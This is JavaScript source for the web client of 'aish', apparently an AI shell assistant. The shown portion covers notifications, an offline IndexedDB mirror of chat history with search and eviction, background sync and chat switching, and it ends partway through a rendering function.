/* aish web client: one WebSocket, dumb rendering.
 *
 * The server owns all state; on every (re)connect it sends hello + a full
 * transcript replay and this client just clears the DOM and re-renders.
 * Approval cards are keyed by request id so a later approval_resolved (live
 * or replayed) collapses them. Assistant answers render as markdown; command
 * output renders ANSI SGR colors. All text lands via textContent /
 * createTextNode — model output never reaches innerHTML. The one exception
 * is highlightFences(): hljs.highlight() escapes the source it's given
 * before wrapping tokens in spans, so it is the model's raw string, escaped
 * by hljs and never by us, that lands in innerHTML — see the comment there.
 */

"use strict";

const $ = (id) => document.getElementById(id);
const messagesEl = $("messages");

// ---- notifications -------------------------------------------------------
// Best-effort: fires only while the page is alive but unfocused (background
// tab, other app in front). True lock-screen push would need Web Push +
// VAPID server-side. On iOS this requires the installed (home-screen) app.
let swRegistration = null;
if ("serviceWorker" in navigator) {
  navigator.serviceWorker
    .register("sw.js")
    .then((registration) => { swRegistration = registration; })
    .catch(() => {});
}

let askedNotify = false;
let replaying = false;

function maybeRequestNotifyPermission() {
  // Called from a user gesture (task submit) — required on iOS.
  if (!("Notification" in window) || Notification.permission !== "default" || askedNotify) {
    return;
  }
  askedNotify = true;
  Notification.requestPermission().catch(() => {});
}

function notify(title, body) {
  if (replaying || document.hasFocus()) return;
  if (!("Notification" in window) || Notification.permission !== "granted") return;
  const options = {
    body: (body || "").slice(0, 140),
    tag: "aish", // coalesce: the newest state is the only one that matters
    icon: "icon-192.png",
    badge: "icon-192.png",
  };
  if (swRegistration) {
    swRegistration.showNotification(title, options).catch(() => {});
  } else {
    try { new Notification(title, options); } catch { /* unsupported */ }
  }
}

// ---- base path (subpath-mounted deploys) --------------------------------
// The app is normally served at "/", but a reverse proxy may mount it under a
// prefix (e.g. https://host/preview/ for a branch preview). Static assets and
// the manifest are already relative; these are the endpoints that were rooted
// at "/". Derive the mount point from the document's directory so ws + fetches
// stay same-origin under whatever prefix served index.html. Always "/"-bounded.
const BASE = location.pathname.replace(/[^/]*$/, "");

// ---- token (optional auth) ----------------------------------------------
const urlToken = new URLSearchParams(location.search).get("token");
if (urlToken) localStorage.setItem("aish-token", urlToken);
const token = localStorage.getItem("aish-token");

// [OPEN-NEW-START]
// `?new` opens a FRESH chat instead of resuming the last one — for a Home
// Screen icon, or a Shortcut, that should always start clean (a shared photo
// landing in its own chat rather than on top of yesterday's conversation).
//
// It is consumed ONCE, here, and stripped from the URL before anything else
// reads it. That is the whole load-bearing part: a launch parameter that
// survived in the address bar would open a new chat on every reload, every
// rev-mismatch reload the app performs on itself, and every relaunch of a PWA
// that restores its last URL — turning one intent into an endless drip of
// empty chats. Stripping it also means a RECONNECT (which re-reads nothing but
// still calls connect()) cannot re-trigger it.
//
// It beats `?session=` if both are somehow given, and suppresses the remembered
// session on this one load: resuming a chat we are about to leave would paint
// it for a moment and then switch, which reads as a glitch.
let openNewOnLoad = new URLSearchParams(location.search).has("new");
if (openNewOnLoad) {
  const url = new URL(location.href);
  url.searchParams.delete("new");
  history.replaceState(null, "", url.pathname + url.search + url.hash);
}
// [OPEN-NEW-END]

// The shareable URL carries a PUBLIC session id WITHOUT the .jsonl storage
// extension, so the link doesn't leak the file-based store — a move to a DB
// would only change these two functions (or push the mapping server-side).
// The wire protocol still uses the store name.
const publicSession = (name) => (name || "").replace(/\.jsonl$/, "");
const storeSession = (id) => (!id || id.endsWith(".jsonl") ? id : `${id}.jsonl`);

// ---- offline mirror (#165) ----------------------------------------------
// A local copy of the conversation archive, so the installed app opens and
// reads its history on a plane, on a foreign SIM, or with the server simply
// off. Three things make this cheap rather than a second implementation:
//
//   * rendering is already a pure function of an event array — onHello() +
//     onReplay() take exactly what the server sends, so a CACHED event array
//     replays through the identical code path with no offline-specific
//     renderer to drift;
//   * the server reconstructs any session's event stream straight off disk
//     (GET /offline/session), so syncing costs no session slot and no Agent;
//   * search ranking is deterministic tiers, not a model, so it ports to JS
//     and behaves the same offline as on.
//
// It doubles as a speed feature: the last session paints from IndexedDB before
// the socket is even open, and a sync that changes nothing costs one small
// request (ETag → 304) instead of re-downloading anything.
//
// Deliberately NOT offered offline: sending. Queuing prompts for later would
// dispatch an agent that runs shell commands at a moment nobody is watching,
// with the approval gate answered by a person who has moved on. Read-only is
// not a limitation here, it is the correct scope.

const OFFLINE_DB = "aish-offline";
const OFFLINE_DB_VERSION = 1;
// Aggressive mirror: everything that fits, newest first. Bulk command output is
// already capped server-side (OFFLINE_OUTPUT_CAP), which is what makes a whole
// archive fit in the space a handful of raw transcripts would take.
const OFFLINE_MAX_BYTES = 150 * 1024 * 1024;
const OFFLINE_MAX_SESSIONS = 200;
const OFFLINE_SEARCH_CHARS = 200000; // per-session searchable text kept for offline search

let offlineDbPromise = null;

// An IndexedDB open can hang FOREVER with no error and no `blocked` event: if a
// deleteDatabase is pending (another tab of this app tapped "Clear offline
// copies" while this one held a connection), a fresh open just queues behind it
// indefinitely. Unguarded, every offline read would await a promise that never
// settles — the first paint silently never happens and the app looks like it
// simply lost the feature. Time it out instead and degrade to online-only; the
// promise is not cached on failure, so the next attempt retries cleanly.
const OFFLINE_OPEN_TIMEOUT_MS = 8000;

function offlineOpen() {
  if (offlineDbPromise) return offlineDbPromise;
  offlineDbPromise = new Promise((resolve, reject) => {
    if (!self.indexedDB) { reject(new Error("no indexedDB")); return; }
    const timer = setTimeout(() => reject(new Error("indexedDB open timed out")),
                             OFFLINE_OPEN_TIMEOUT_MS);
    const settle = (fn) => (value) => { clearTimeout(timer); fn(value); };
    resolve = settle(resolve);
    reject = settle(reject);
    const request = indexedDB.open(OFFLINE_DB, OFFLINE_DB_VERSION);
    request.onupgradeneeded = () => {
      const db = request.result;
      // Metadata and bodies are separate stores on purpose: the session list
      // and the search index read ONLY metadata, so opening the sessions sheet
      // never deserializes megabytes of transcripts.
      if (!db.objectStoreNames.contains("meta")) db.createObjectStore("meta", { keyPath: "name" });
      if (!db.objectStoreNames.contains("events")) db.createObjectStore("events", { keyPath: "name" });
      if (!db.objectStoreNames.contains("kv")) db.createObjectStore("kv", { keyPath: "k" });
    };
    request.onsuccess = () => {
      const db = request.result;
      // The other half of the deadlock: if ANOTHER tab clears offline data,
      // step aside instead of blocking its delete forever. Dropping the cached
      // promise means the next read reopens on the rebuilt database.
      db.onversionchange = () => { db.close(); offlineDbPromise = null; };
      resolve(db);
    };
    request.onerror = () => reject(request.error);
    request.onblocked = () => reject(new Error("indexedDB blocked"));
  }).catch((err) => {
    offlineDbPromise = null; // a private-mode / quota refusal may succeed later
    throw err;
  });
  return offlineDbPromise;
}

function idbRun(store, mode, fn) {
  return offlineOpen().then(
    (db) =>
      new Promise((resolve, reject) => {
        const tx = db.transaction(store, mode);
        const result = fn(tx.objectStore(store));
        tx.oncomplete = () => resolve(result && result.__req ? result.__req.result : result);
        tx.onerror = () => reject(tx.error);
        tx.onabort = () => reject(tx.error);
      })
  );
}

const idbGet = (store, key) => idbRun(store, "readonly", (s) => ({ __req: s.get(key) }));
const idbAll = (store) => idbRun(store, "readonly", (s) => ({ __req: s.getAll() }));
const idbPut = (store, value) => idbRun(store, "readwrite", (s) => { s.put(value); });
const idbDel = (store, key) => idbRun(store, "readwrite", (s) => { s.delete(key); });

// Every offline read is best-effort: a browser in private mode, a denied quota
// or a corrupt database must degrade to "online only", never to a broken app.
const offlineSafe = (promise, fallback = null) => promise.catch(() => fallback);

// ---- offline: what a cached session looks like ---------------------------
// meta:   { name, title, snippet, ts, origin, pinned, openedAt, syncedAt,
//           total, sig, bytes, text }
// events: { name, events: [...] }   ← replayed verbatim through onReplay()

// [OFFLINE-INDEX-START]
// One message as WORDS — session.py's `plain_text`. Markdown is formatting: a
// link becomes its label (the href is machinery), `**` and backticks go, single
// `*`/`_` stay because they live inside identifiers far more often than they
// mean italics.
function offlinePlainText(content) {
  return (content || "")
    .split("\n")
    .map((line) => line.replace(/^\s{0,3}(?:[-*+]\s+|\d+[.)]\s+|#{1,6}\s+|>\s?)+/, ""))
    .join("\n")
    .replace(/!\[([^\]]*)\]\([^)]*\)/g, "$1")
    .replace(/\[([^\]]+)\]\([^)]*\)/g, "$1")
    .replace(/\*\*|`/g, "");
}

function offlineSearchText(events) {
  // Only what a person would search FOR: their own words and aish's answers.
  // Command output is noise in a search index (and the bulk of the bytes).
  // Server half in `visible_messages` (session.py) — same rule, one meaning.
  const parts = [];
  for (const event of events || []) {
    if (event.type === "user" && event.text) parts.push(offlinePlainText(event.text));
    else if (event.type === "done" && event.result) parts.push(offlinePlainText(event.result));
    else if (event.type === "history") {
      // The flat blob a log too old to reconstruct falls back to: raw records,
      // tool results included, so the roles have to be filtered HERE (#266).
      for (const m of event.messages || []) {
        if (m.content && (m.role === "user" || m.role === "assistant")) {
          parts.push(offlinePlainText(m.content));
        }
      }
    }
  }
  // In the case it was WRITTEN in: a row now quotes the line it matched on, and
  // an answer rendered in lower case would be the search's machinery on screen.
  // Matching lower-cases it where it compares. Metas written before this hold
  // the old lower-cased text; they still rank, and heal on their next sync.
  // " · " and not a newline: it survives the whitespace flatten an excerpt does,
  // so a quoted match never reads as one sentence spoken by nobody — and a
  // phrase cannot match across the gap between a question and its answer.
  return parts.join(" · ").slice(0, OFFLINE_SEARCH_CHARS);
}
// [OFFLINE-INDEX-END]

async function offlineSave(name, payload, events) {
  const text = offlineSearchText(events);
  const meta = {
    name,
    title: payload.title || "",
    snippet: payload.snippet || "",
    ts: payload.ts || Date.now() / 1000,
    out: payload.out || 0, // last OUTPUT; 0 = fall back to `ts` (#203)
    origin: payload.origin || "user",
    pinned: Boolean(payload.pinned),
    openedAt: payload.openedAt || 0,
    syncedAt: Date.now(),
    total: payload.total || events.length,
    sig: payload.sig || "",
    // Approximate, and that is fine — it decides eviction order, not correctness.
    bytes: JSON.stringify(events).length + text.length,
    text,
  };
  await idbPut("events", { name, events });
  await idbPut("meta", meta);
  return meta;
}

async function offlineLoad(name) {
  const [meta, body] = await Promise.all([
    offlineSafe(idbGet("meta", name)),
    offlineSafe(idbGet("events", name)),
  ]);
  if (!meta || !body) return null;
  return { meta, events: body.events || [] };
}

async function offlineList() {
  return (await offlineSafe(idbAll("meta"), [])) || [];
}

// [OFFLINE-EVICT-START]
// Which cached sessions to drop when over budget, lowest value first.
// Priority, highest to lowest: explicitly pinned ("Available offline" — the
// user's promise to themselves that a reference chat is always there), then the
// session on screen, then most-recently-opened-on-this-device, then
// most-recently-active anywhere (which is what makes a chat started on the
// laptop readable on the phone without opening it first).
function offlineEvictionOrder(metas, current) {
  const value = (m) => Math.max(m.openedAt || 0, (m.ts || 0) * 1000);
  return metas
    .filter((m) => !m.pinned && m.name !== current)
    .sort((a, b) => value(a) - value(b)); // oldest-value first = evict first
}

function offlineOverBudget(metas, maxBytes, maxSessions) {
  const bytes = metas.reduce((sum, m) => sum + (m.bytes || 0), 0);
  return bytes > maxBytes || metas.length > maxSessions;
}

// Returns the names to delete, in order, to get back under budget. Pinned
// sessions are counted against the budget but never returned — a mirror that
// silently dropped what you pinned would be worse than one that ran over.
function offlinePlanEviction(metas, current, maxBytes, maxSessions) {
  const doomed = offlineEvictionOrder(metas, current);
  const keep = new Map(metas.map((m) => [m.name, m]));
  const evict = [];
  for (const meta of doomed) {
    if (!offlineOverBudget([...keep.values()], maxBytes, maxSessions)) break;
    keep.delete(meta.name);
    evict.push(meta.name);
  }
  return evict;
}
// [OFFLINE-EVICT-END]

async function offlineEnforceBudget(current) {
  const metas = await offlineList();
  const evict = offlinePlanEviction(metas, current, OFFLINE_MAX_BYTES, OFFLINE_MAX_SESSIONS);
  for (const name of evict) {
    await offlineSafe(idbDel("events", name));
    await offlineSafe(idbDel("meta", name));
  }
  return evict.length;
}

// [OFFLINE-SEARCH-START]
// Offline port of SessionLog.rank (session.py) — same tiers, same order, so a
// search offline ranks like the same search online. Tiers 5..2 are exact ports;
// tier 1's fuzzy match approximates difflib's SequenceMatcher with an
// LCS ratio, which agrees with it for the typo-shaped cases it exists to catch.
const OFFLINE_FUZZY_THRESHOLD = 0.55;  // whole query vs whole title
const OFFLINE_FUZZY_WORD_CUTOFF = 0.75; // single query word vs single session word
const OFFLINE_FUZZY_LEN_SLACK = 1;      // a typo keeps a word's length (#266)
const OFFLINE_CLOSEST_MAX = 10;         // rows the "closest chats" fallback shows
const OFFLINE_PUNCT_RE = /^[.,;:!?()[\]{}<>'"`]+|[.,;:!?()[\]{}<>'"`]+$/g;

function lcsRatio(a, b) {
  if (!a.length || !b.length) return 0;
  // Rolling single row: query words and titles are short, and this runs per
  // candidate per keystroke.
  let prev = new Array(b.length + 1).fill(0);
  for (let i = 1; i <= a.length; i += 1) {
    const row = new Array(b.length + 1).fill(0);
    for (let j = 1; j <= b.length; j += 1) {
      row[j] = a[i - 1] === b[j - 1] ? prev[j - 1] + 1 : Math.max(prev[j], row[j - 1]);
    }
    prev = row;
  }
  return (2 * prev[b.length]) / (a.length + b.length);
}

// One flattened line of context around the first query-word hit, or "" when the
// chat holds none of them (a title or model match, or a closest-chats row) —
// SessionLog._snippet / _match_row. A search row whose preview is the chat's
// LAST message says nothing about why the chat is in the list, which on screen
// is indistinguishable from the search being wrong (#266).
const OFFLINE_SNIPPET_CHARS = 90;
const OFFLINE_SNIPPET_LEAD = 15; // a rail row is one truncated line (#266)

function offlineMatchSnippet(text, words) {
  const flat = (text || "").split(/\s+/).filter(Boolean).join(" ");
  const flatCf = flat.toLowerCase();
  let pos = -1;
  for (const word of words) {
    const at = flatCf.indexOf(word);
    if (at >= 0 && (pos < 0 || at < pos)) pos = at;
  }
  if (pos < 0) return "";
  let start = Math.max(0, pos - OFFLINE_SNIPPET_LEAD);
  if (start) {
    const space = flat.indexOf(" ", start);
    if (space >= 0 && space < pos) start = space + 1;
  }
  const end = Math.min(flat.length, start + OFFLINE_SNIPPET_CHARS);
  return (start > 0 ? "…" : "") + flat.slice(start, end) + (end < flat.length ? "…" : "");
}

// The line to show under one row's title — SessionLog._match_row. Quote only
// what the row is NOT already showing: a hit inside the chat's own name is on
// screen already, so when the name is the opening of the conversation only a hit
// past it earns a line, and a sole mention there leaves the preview alone.
function offlineMatchLine(meta, words) {
  let text = meta.text || "";
  const title = (meta.title || "").replace(/…+$/, "");
  if (title && text.startsWith(title)) {
    text = text.slice(title.length);
    if (text.startsWith(" · ")) text = text.slice(3);
  }
  return offlineMatchSnippet(text, words);
}

// The ranked rows alone, for callers with nowhere to say how they were found —
// SessionLog.rank.
function offlineRank(metas, query) {
  return offlineRanked(metas, query).sessions;
}

// The ranked rows AND what kind of answer they are: `approximate` means nothing
// matched literally, so the rows will not contain the query and the list has to
// say so — SessionLog.ranked.
function offlineRanked(metas, query) {
  const queryCf = query.split(/\s+/).filter(Boolean).join(" ").toLowerCase();
  const words = queryCf ? queryCf.split(" ") : [];
  if (!words.length) {
    return {
      sessions: metas.slice().sort((a, b) => (b.ts || 0) - (a.ts || 0)),
      approximate: false,
      words,
    };
  }
  const scored = [];
  for (const meta of metas) {
    const titleCf = (meta.title || "").toLowerCase();
    const contentCf = (meta.text || "").toLowerCase();
    let score;
    if (titleCf === queryCf) score = 5;
    else if (titleCf.includes(queryCf)) score = 4;
    else if (contentCf.includes(queryCf)) score = 3;
    else if (words.every((w) => contentCf.includes(w))) score = 2;
    else continue;
    scored.push({ score, meta });
  }
  // Nothing you typed is in any chat — a different question, answered
  // separately, and only then (#266). Mixed into a search that worked, the
  // approximate tier was most of what came back.
  if (!scored.length) {
    return { sessions: offlineClosest(metas, queryCf, words), approximate: true, words };
  }
  // Newest-first within a tier, matching the server (whose input is already
  // recency-ordered and whose sort is stable).
  scored.sort((a, b) => b.score - a.score || (b.meta.ts || 0) - (a.meta.ts || 0));
  return { sessions: scored.map((s) => s.meta), approximate: false, words };
}

// The chats nearest a query nothing matched, closest first and capped —
// SessionLog._closest.
function offlineClosest(metas, queryCf, words) {
  const scored = [];
  for (const meta of metas) {
    const ratio = offlineCloseness(meta, queryCf, words);
    if (ratio !== null) scored.push({ ratio, meta });
  }
  scored.sort((a, b) => b.ratio - a.ratio || (b.meta.ts || 0) - (a.meta.ts || 0));
  return scored.slice(0, OFFLINE_CLOSEST_MAX).map((s) => s.meta);
}

// How near one chat is, or null for "not near at all". Every query word needs a
// near word of ITS OWN LENGTH: without that guard 0.75 is a length artifact —
// "tel" scores it against "tefal" — and every chat holds some short word.
function offlineCloseness(meta, queryCf, words) {
  const titleCf = (meta.title || "").toLowerCase();
  const vocab = new Set(
    (meta.text || "").toLowerCase()
      .split(/\s+/).map((w) => w.replace(OFFLINE_PUNCT_RE, "")).filter(Boolean)
  );
  let weakest = 1;
  for (const word of words) {
    let best = 0;
    for (const candidate of vocab) {
      if (Math.abs(candidate.length - word.length) > OFFLINE_FUZZY_LEN_SLACK) continue;
      const ratio = lcsRatio(word, candidate);
      if (ratio > best) best = ratio;
    }
    if (best < OFFLINE_FUZZY_WORD_CUTOFF) {
      const title = lcsRatio(queryCf, titleCf);
      return title >= OFFLINE_FUZZY_THRESHOLD ? title : null;
    }
    if (best < weakest) weakest = best;
  }
  return weakest;
}
// [OFFLINE-SEARCH-END]

// ---- offline: connectivity ----------------------------------------------
// "Offline" here means OUR server is unreachable, which is not the same as
// navigator.onLine (a hotel wifi with no route home is "online"). The socket is
// the ground truth; navigator.onLine only ever accelerates the conclusion.
let offlineMode = false;

function setOfflineMode(value) {
  if (offlineMode === value) return;
  offlineMode = value;
  document.body.classList.toggle("offline", value);
  const bar = $("offlinebar");
  if (bar) bar.hidden = !value;
  // One bar, not two: the offline bar says everything "reconnecting…" did and
  // adds what still works, and it carries the same tap-to-retry. Retries keep
  // running underneath either way.
  if (value) $("connbar").hidden = true;
  if (!value) offlineSyncSoon(0);
}

// ---- offline: background sync -------------------------------------------
// One pass = fetch the catalogue, then fetch each session that changed, newest
// first, one at a time. It is resumable by construction rather than by
// bookkeeping: each session commits atomically, and the next pass recomputes
// what is missing from the same timestamp comparison — so a sync interrupted by
// a tunnel picks up exactly where it stopped, with no partial state to repair.

const OFFLINE_SYNC_IDLE_MS = 5 * 60 * 1000; // periodic catch-up while connected
const OFFLINE_SYNC_AFTER_DONE_MS = 15 * 1000; // debounce after a finished turn
const FIRST_PAINT_GRACE_MS = 250; // let a fast LAN replay win the first paint outright
const OFFLINE_SYNC_GAP_MS = 40;             // breathing room between sessions

let offlineSyncing = false;
let offlineSyncTimer = null;
let offlinePersistAsked = false;
const offlineMeta = new Map(); // name -> cached meta, for badges and lookups

function offlineUrl(path, params) {
  const url = new URL(BASE + path, location.href);
  for (const [key, value] of Object.entries(params || {})) {
    if (value !== undefined && value !== null && value !== "") url.searchParams.set(key, value);
  }
  if (token) url.searchParams.set("token", token);
  return url.toString();
}

// Opening a chat is the strongest signal that it matters to this device — it
// outranks recency in the eviction order (offlineEvictionOrder).
async function offlineTouch(name) {
  const meta = await offlineSafe(idbGet("meta", name));
  if (!meta) return;
  meta.openedAt = Date.now();
  await offlineSafe(idbPut("meta", meta));
  offlineMeta.set(name, meta);
}

async function offlineRefreshMetaMap() {
  offlineMeta.clear();
  for (const meta of await offlineList()) offlineMeta.set(meta.name, meta);
}

// [MIRROR-FORGET-START]
// Dropping this device's copy of a chat that is gone from the server. ONE
// function, because there are two ways to learn it — the sync notices the
// catalogue no longer lists it, and the socket says so outright
// (`session_deleted`, `no_such_session`) — and a chat half-forgotten by one of
// them is a ghost the other never gets to clean up.
async function offlineForget(name) {
  if (!name) return;
  await offlineSafe(idbDel("events", name));
  await offlineSafe(idbDel("meta", name));
  offlineMeta.delete(name);
}

// PURE: the cached chats the server's catalogue no longer lists.
//
// GONE IS GONE, pin included. A pin means "keep this copy for me" against
// EVICTION — the budget sweep that gives up chats to stay under quota — and it
// was read here as "keep it even if the chat no longer exists", which is not a
// promise anyone made: the delete confirmation says in as many words that the
// copy on your devices goes too. What it bought instead was a row no sync could
// ever remove.
function mirrorOrphans(cached, serverNames) {
  return Array.from(cached.keys()).filter((name) => !serverNames.has(name));
}
// [MIRROR-FORGET-END]

async function offlineFetchSession(name, local) {
  // since/sig ask for a delta; the ETag asks for nothing at all. Both are
  // values the server minted — the client stores them opaquely and echoes them,
  // so there is no protocol detail to get wrong on this side.
  const url = offlineUrl("offline/session", {
    session: name,
    since: local?.total || "",
    sig: local?.sig || "",
  });
  const headers = local?.etag ? { "If-None-Match": local.etag } : {};
  const response = await fetch(url, { headers, cache: "no-store" });
  if (response.status === 304) return "unchanged";
  if (!response.ok) throw new Error(`offline sync ${response.status}`);
  const payload = await response.json();
  const previous = payload.base > 0 ? (await offlineLoad(name))?.events || [] : [];
  // base > 0 means the server verified our prefix, so appending is safe;
  // base === 0 means it did not, and the full stream replaces what we had.
  const events =
    payload.base > 0 ? previous.slice(0, payload.base).concat(payload.events) : payload.events;
  const meta = await offlineSave(name, {
    ...payload,
    pinned: local?.pinned,
    openedAt: local?.openedAt,
  }, events);
  meta.etag = response.headers.get("etag") || "";
  await idbPut("meta", meta);
  offlineMeta.set(name, meta);
  return "updated";
}

async function offlineSyncOnce() {
  if (offlineSyncing || offlineMode) return;
  offlineSyncing = true;
  try {
    const response = await fetch(offlineUrl("offline/index"), { cache: "no-store" });
    if (!response.ok) return; // 403 (bad token) or a server mid-restart: try later
    const index = await response.json();
    await offlineRefreshMetaMap();
    const server = new Map(index.sessions.map((s) => [s.name, s]));

    // A session deleted on the server is dropped locally too — a mirror that
    // resurrects deleted chats is a surprise, not a feature ([MIRROR-FORGET]).
    for (const name of mirrorOrphans(offlineMeta, server)) await offlineForget(name);

    // The catalogue is newest-first, so a sync cut short by a dying connection
    // has still fetched the sessions most likely to be wanted.
    for (const info of index.sessions) {
      if (offlineMode) break;
      // The chat on screen is the one you least need mirrored right now, and
      // the one whose refetch costs the most (its mtime moves every turn, so
      // it re-syncs on every pass — a full server-side re-parse plus an
      // IndexedDB rewrite that grows with the chat). It catches up when the
      // app goes hidden (see visibilitychange), which is when the mirror is
      // actually about to be needed.
      if (info.name === currentSession && document.visibilityState === "visible") continue;
      const local = offlineMeta.get(info.name);
      // Second-resolution mtimes: only refetch on a strictly newer stamp, or
      // the current session would be refetched on every single pass.
      if (local && local.ts >= info.ts && local.total) continue;
      try {
        await offlineFetchSession(info.name, local);
      } catch {
        return; // network died mid-pass; the next pass resumes from here
      }
      await new Promise((resolve) => setTimeout(resolve, OFFLINE_SYNC_GAP_MS));
    }
    await offlineEnforceBudget(currentSession);
    await offlineRefreshMetaMap();
    if (!offlinePersistAsked && navigator.storage?.persist) {
      // Ask ONCE, after there is something worth keeping: persistent storage
      // exempts the mirror from the browser's eviction-under-pressure sweep.
      offlinePersistAsked = true;
      navigator.storage.persist().catch(() => {});
    }
  } catch { /* offline or blocked — the next trigger retries */ }
  finally {
    offlineSyncing = false;
  }
}

function offlineSyncSoon(delay = 1500) {
  clearTimeout(offlineSyncTimer);
  offlineSyncTimer = setTimeout(() => {
    offlineSyncOnce().finally(() => offlineSyncSoon(OFFLINE_SYNC_IDLE_MS));
  }, delay);
}

// ---- offline: reading a cached session ----------------------------------
let offlineViewing = false; // the transcript on screen came from the mirror
let serverPainted = false;  // an authoritative replay has landed — don't overpaint it

// [SESSION-ENTER-START]
// "The view is now chat X" has ONE owner, and this is it (#181 phase 2).
//
// Four paths reach that transition — a server hello, a mirror read with no
// socket, the boot paint from IndexedDB, and the speculative paint of a
// prefetched swipe — and each used to hand-roll its own subset of the same
// coupled facts. The subsets DIVERGED, which is the defect this fence exists to
// make impossible: the boot paint never reset the view fingerprint and never
// remembered where it landed, an unguarded localStorage write mid-hello could
// abort the whole rest of the hello in private mode (no workspace, no busy
// state, no boot-loader hide), and during any switch there was a window where
// the identity, the title, the URL and the DOM each named a different chat.
//
// So every coupled write happens HERE, in one fixed total order, on every path:
//
//   1. stash the outgoing view — before identity moves, since that DOM belongs
//      to the chat being left
//   2. reset the view fingerprint, IFF the name actually changes
//   3. identity (currentSession)
//   4. provenance (offlineViewing: is what we are about to paint authoritative)
//   5. title
//   6. persistence, GUARDED
//   7. the URL
//   8. the mirror's MRU stamp and the offline-pin toggle, which both follow
//      whatever chat is on screen
//
// A caller can no longer FORGET one of these — it can only call the owner. What
// legitimately differs rides in `opts`: `source` (who is painting, which is
// what decides whether the paint is authoritative), `title` (omit to leave the
// header alone), `stash` (only a hello leaves behind a settled view worth
// keeping).
//
// The fingerprint rule is load-bearing in BOTH directions. Reset it on a real
// change, or a cross-session fingerprint collision could keep the wrong DOM;
// do NOT reset it when the name is unchanged, because a prefetched swipe moves
// identity ahead of the hello ON PURPOSE — that later hello then reads as "same
// session" and its replay lands as a no-op instead of rendering a second time.
//
// One deliberate behaviour change came with the consolidation: the boot paint
// now writes `aish-session` and resets the fingerprint like everyone else. The
// key follows what is actually on screen — which the URL already did through
// deepLinkSession, and connect() prefers the URL anyway — so this closes a
// divergence rather than opening one.
let currentSession = null;

// The URL always names the viewed session (shareable, and it identifies the
// log for debugging), alongside the token and any #console hash. replaceState
// so it doesn't spam browser history.
//
// It is also what connect() reads to decide where to reconnect, and the URL
// WINS over the last-session key — so a session opened from the mirror must
// update it too. Without that, reading an old chat offline and then regaining
// signal would yank you back to whatever chat the last hello had pinned here.
function deepLinkSession(name) {
  const url = new URL(location.href);
  const pub = publicSession(name);
  if (url.searchParams.get("session") === pub) return;
  url.searchParams.set("session", pub);
  history.replaceState(null, "", url.pathname + url.search + url.hash);
}

function enterSession(name, { source = "hello", title, stash = false } = {}) {
  if (stash) stashCurrentView();
  // A switch must never let the outgoing chat's fingerprint "noop" the incoming
  // replay; an unchanged name must never lose the one the prefetch just painted.
  if (name !== currentSession) { viewFp = ""; viewDirty = true; }
  // A backfill in flight belongs to the chat being LEFT ([BACKFILL]): its
  // reading position must not be applied to the one arriving.
  if (name !== currentSession) { backfillFromBottom = -1; endBackfill(); }
  currentSession = name;
  // Only the mirror paints a truncated copy, and only an unstashable view may
  // come from one — so provenance is a property of the SOURCE, not a flag each
  // path remembers to set (the boot paint never did, so its DOM was stashable
  // and reusable as if it had come off the socket).
  offlineViewing = source === "mirror" || source === "boot";
  if (title !== undefined) setTitle(title);
  try {
    localStorage.setItem("aish-session", name); // where a reconnect returns
  } catch { /* private mode: the chat is entered, just not remembered */ }
  deepLinkSession(name);
  markSeen(name);        // "the view is now X" IS "this device has seen X" ([SEEN])
  offlineTouch(name);    // MRU input to the mirror's eviction order
  refreshOfflinePinUi(); // the toggle belongs to the chat now on screen
  refreshRailCurrent();  // and so does the rail's "you are here" mark
}
// [SESSION-ENTER-END]

async function openCachedSession(name) {
  const cached = await offlineLoad(name);
  if (!cached) {
    showToast("that chat isn't available offline");
    return false;
  }
  enterSession(name, { source: "mirror", title: cached.meta.title || "aish" });
  onReplay({ events: cached.events, truncated: false });
  return true;
}

// Switching chats: the socket when there is one, the mirror when there isn't.
//
// LEAVING IS A LOCAL ACT, and that is the whole rule here. This used to send
// "switch me" and then, on anything but a warm-peek hit, do NOTHING until the
// server answered — no transcript, no title, no URL. The rail would slide away
// over the chat you had just left and leave it sitting there for the whole
// round trip, which on a slow link is indistinguishable from a tap that never
// registered: you tap again, or you start typing into a chat you believe you
// have already left. So every path below leaves immediately and paints the best
// copy this device can reach; the server's replay is a CORRECTION, never the
// first sign that the tap was heard.
function resumeSession(name) {
  if (ws && ws.readyState === WebSocket.OPEN) {
    if (!send({ type: "resume", path: name })) return;
    // A warm peek paints the landing NOW instead of leaving the chat you are
    // leaving on screen for the whole round trip. Identity moves BEFORE the
    // hello on purpose — [SESSION-ENTER] preserves that — so the hello reads as
    // "same session" and its authoritative replay no-ops on the matching
    // fingerprint; a stale peek just misses and rebuilds.
    const pre = freshPrefetch(name);
    if (pre) {
      enterSession(name, { source: "prefetch", title: knownTitle(name) });
      onReplay({ events: pre.events, truncated: pre.truncated, total: pre.total });
      return;
    }
    // Nothing warm in memory — only the two most recent chats are ever pre-warmed,
    // so this is the COMMON case for anything further down the rail. Leave the
    // outgoing chat anyway and let [PENDING-VIEW] find something to paint.
    enterSession(name, { source: "pending", title: knownTitle(name) });
    awaitPaint(name);
    return;
  }
  openCachedSession(name);
}

// [PENDING-VIEW-START]
// The transcript is BETWEEN chats: the tap has been honoured (identity, title
// and URL already name the chat you asked for) and nothing has painted it yet.
//
// Three things end that state, and the order is the point. The offline mirror
// this device already holds is tried FIRST — it holds nearly every chat, and
// until now it was consulted only when the socket was down, so on the one
// connection where it would help most (up, but slow) it sat unused. Then the
// server's authoritative replay, which lands through onReplay like any other
// and corrects whatever the mirror showed. Failing both, a placeholder that
// says what is happening — because the honest answer "still fetching this" is
// worth far more to a reader than the previous conversation left on screen
// pretending to be the new one.
const PENDING_VIEW_SLOW_MS = 6000;
let awaitingPaint = null; // name of the chat whose FIRST paint we are waiting for
let awaitingTimer = null;

function awaitPaint(name) {
  awaitingPaint = name;
  clearTimeout(awaitingTimer);
  renderLoadingTranscript();
  paintFromMirror(name);
  // A socket can report OPEN long after it died; the send then vanishes and no
  // event ever arrives to end the wait. Say so, and offer the one control that
  // fixes it, rather than spinning forever.
  awaitingTimer = setTimeout(() => {
    if (awaitingPaint === name) markPendingViewStalled();
  }, PENDING_VIEW_SLOW_MS);
}

// Any paint of the transcript ends the wait, whoever made it. Called from
// onReplay so no future painter has to remember to.
function paintLanded() {
  awaitingPaint = null;
  clearTimeout(awaitingTimer);
  awaitingTimer = null;
}

function renderLoadingTranscript() {
  // The outgoing chat's DOM is going away, so its live turn goes with it — the
  // same reasoning (and the same owner) as a replay that rebuilds.
  resetLiveTurn("rebuild");
  clearPendingSends();
  stopSpeaking();
  messagesEl.replaceChildren();
  clearQueueChips();
  const row = document.createElement("div");
  row.className = "msg notice loading-view";
  const spin = document.createElement("span");
  spin.className = "spin";
  const text = document.createElement("span");
